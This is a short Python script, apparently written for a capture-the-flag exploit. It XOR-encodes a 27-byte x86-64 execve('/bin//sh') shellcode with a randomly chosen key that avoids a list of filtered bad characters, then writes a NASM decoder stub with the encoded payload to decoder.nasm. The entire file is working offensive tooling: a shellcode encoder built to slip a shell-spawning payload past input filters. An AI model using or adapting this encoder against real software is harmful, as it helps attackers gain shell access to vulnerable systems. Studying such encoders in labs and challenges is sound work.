import random

# badchars list
bad_chars = [
    0x00, 0x3b, 0x54, 0x62, 0x69, 0x6e, 0x73, 0x68, 
    0xf6, 0xd2, 0xc0, 0x5f, 0xc9, 0x66, 0x6c, 0x61, 0x67
]

# Shellcode ori (27 bytes)
shellcode = bytearray(b"\x90\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x54\x5e\x57\x54\x5a\x0f\x05")

# put all the valid key to the list
valid_keys = []

for R in range(1, 256):
    if R in bad_chars:
        continue
    temp_encoded = bytearray()
    is_valid = True
    for b in shellcode:
        y = b ^ R
        if y in bad_chars:
            is_valid = False
            break
        temp_encoded.append(y)
    if is_valid:
        valid_keys.append((R, temp_encoded))

if not valid_keys:
    print("[-] Tidak ditemukan key XOR yang aman!")
    exit(1)

# Choose one of a valid key randomly
valid_key, encoded_bytes = random.choice(valid_keys)

print("[+] Key XOR terpilih (Acak): 0x%02x" % valid_key)

# Format byte untuk NASM db
db_str = ",".join(["0x%02x" % b for b in encoded_bytes])

# Stub decoder super ringkas (< 20 bytes), total dengan shellcode dijamin < 60 bytes
code = f"""global _start
section .text
_start:
    jmp short skip
dec:
    pop rsi
    mov cl, {len(shellcode)}
l:
    xor byte [rsi+rcx-1], 0x{valid_key:02x}
    loop l
    jmp rsi
skip:
    call dec
    db {db_str}
"""

with open("decoder.nasm", "w") as f:
    f.write(code)

print("[+] File decoder.nasm berhasil diperbarui!")
